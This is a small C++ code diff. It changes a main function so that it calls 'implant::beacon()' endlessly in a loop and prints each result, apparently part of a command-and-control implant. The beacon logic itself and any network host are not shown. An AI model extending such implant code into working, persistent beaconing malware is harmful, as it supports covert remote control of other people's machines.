@@ -6,11 +6,13 @@
 #include <iostream>
 
 int main() {
-    // Call the beacon function
-    std::string result = implant::beacon();
+    while (true) { // Run indefinitely
+        // Call the beacon function
+        std::string result = implant::beacon();
 
-    // Output the result (if needed)
-    std::cout << "Result: " << result << std::endl;
+        // Output the result (if needed)
+        std::cout << "Result: " << result << std::endl;
+    }
 
     return 0;
 }
